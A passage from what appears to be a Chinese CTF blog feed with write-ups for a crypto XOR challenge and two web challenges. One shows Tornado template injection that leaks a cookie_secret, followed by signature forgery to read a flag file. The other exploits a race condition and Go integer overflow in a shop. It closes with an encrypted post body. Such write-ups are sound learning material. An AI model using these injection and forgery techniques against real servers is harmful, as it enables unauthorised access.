L^R^k0^k1^k3^k5^k6</span><br></pre></td></tr></table></figure></p><p>根据异或运算得特性<br>已知test(也就是L，R),fez(test,k)(也就是f,g)，即可通过test与fez(test,k) 进行异或运算可得出 <code>k0^k1^k3^k5^k6</code> ，<code>k1^k2^k4^k5</code><br>从而还原flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line">test = <span class="string">'50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'</span></span><br><span class="line">test = binascii.a2b_hex(test)</span><br><span class="line">test_k = <span class="string">'66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'</span></span><br><span class="line">test_k = binascii.a2b_hex(test_k)</span><br><span class="line">m_k = <span class="string">'44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'</span></span><br><span class="line">m_k = binascii.a2b_hex(m_k)</span><br><span class="line"> </span><br><span class="line">l = test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r = test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l1 = test_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r1 = test_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l2 = m_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r2 = m_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"> </span><br><span class="line">c = xor(xor(l,r),r1)</span><br><span class="line">Lr = xor(c,r2)</span><br><span class="line">d = xor(r,l1)</span><br><span class="line">R = xor(d,l2)</span><br><span class="line">L = xor(Lr,R)</span><br><span class="line">m = L+R  </span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iUP9cn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/13/iUP9cn.md.png" alt="iUP9cn.md.png"></a></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>这里的web题目是我趁着题目还没关的时候赶紧复现的（不会做后面弄懂也是学习的方法呀23333），感谢一叶飘零学长的帮助哇。。。。</p><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>这个题目上来每个选项url就很可疑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.95.5:31792/file?filename=Orz.txt&amp;signature=d227ce6c7cea5a9cd7f1721e0baace7d</span><br><span class="line"></span><br><span class="line">Orz.txt</span><br><span class="line">render() </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=hint.txt&amp;signature=c7b8660e245f1360c378db1074a2a4c7</span><br><span class="line"></span><br><span class="line">hint.txt</span><br><span class="line">md5(cookie_secret + md5(filename)) </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=flag.txt&amp;signature=d24b2dc1952a495057af1a898c55931b</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>很明显是去读文件<code>/fllllllllllag</code> ，并且要带上签名，一开始我做这个题的时候还以为强行爆破一波secret。。。还一度认为是Hash长度拓展攻击。。。。尴尬</p><p>关键点在于<code>cookie_secret</code></p><p>当我们随便输入东西的时候会出现一个报错页面<br><a href="https://imgchr.com/i/iUPn39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPn39.md.png" alt="iUPn39.md.png"></a></p><p>这个页面过滤了很多东西，并且返回Orz</p><p>输入</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p><a href="https://imgchr.com/i/iUPucR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPucR.md.png" alt="iUPucR.md.png"></a></p><p>这里的话飘零大佬说可以进行模板注入，并且只能读一个变量<br>接下来的思路才是骚，直接阅读tornado的源码<br><code>https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</code></p><p>在<code>handler.settings</code> 里面存在<code>cookie_secret</code>这东西</p><p>读取一下</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p>注意一下，这里的两个大括号{}是起到渲染模板的作用。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure><p>可以把里面的内容给读出来，以后还是得对python的MVC架构学习一下才行。。</p><p>立即构造签名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb'</span>.md5(<span class="string">'/fllllllllllag'</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>http://49.4.95.5:31792/file?filename=/fllllllllllag&amp;signature=3e9f949b7c37c999287eb096f576be00</code></p><p>得到flag<br><a href="https://imgchr.com/i/iUPKj1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPKj1.md.png" alt="iUPKj1.md.png"></a></p><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>这个题目一开始我一直以为是前端的<code>ajax</code>的操作问题，直到看了飘零大哥的wp才知道有两种思路，一种是条件竞争，但条件竞争好像还是有上限的，开个多线程跑一下，这也是为了后面的怪异的<code>9999999</code>做铺垫,因为你没有5个以上的大辣条是换不了辣条之王的。<br><img src="https://s1.ax1x.com/2018/10/14/iUP1HK.png" alt="iUP1HK.png"><br>然后就会发现辣条数目几变成7个<br><img src="https://s1.ax1x.com/2018/10/14/iUP8AO.png" alt="iUP8AO.png"></p><p>下面才是重点，因为这里是用的是Go语言，很可能存在整数溢出，可以参考一下这篇文章<br><a href="http://www.it1352.com/808569.html" target="_blank" rel="noopener">http://www.it1352.com/808569.html</a></p><p>go语言整数溢出为<code>18446744073709551615</code>，然后可以计算<code>number=(18446744073709551615/5)+1=3689348814741910324</code>，然后我们可以直接溢出获得flag<br>下面这篇博客对于溢出过大有更深的理解:<br><a href="https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://imgchr.com/i/iUPGND" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPGND.md.png" alt="iUPGND.md.png"></a></p><p>还有一道题目是关于Laravel框架的解题过程，也是秀，知识点也很多，建议去看看一叶飘零学长的博客啦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这比赛又学到了不少的东西，果然python开发出来的web框架还是自己的弱项，条件竞争这东西看来现在比赛都很流行呢，可惜自己对这方面的做题敏感度不够，以前一直认为这只有安恒的月赛才会出，以后还是得接触pwn了，继续努力。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMT平台的部分题解</title>
    <link href="0verwatch.top/2018/09/30/CUMT-CTF-Platform/"/>
    <id>0verwatch.top/2018/09/30/CUMT-CTF-Platform/</id>
    <published>2018-09-30T06:59:37.000Z</published>
    <updated>2018-10-09T07:23:35.986Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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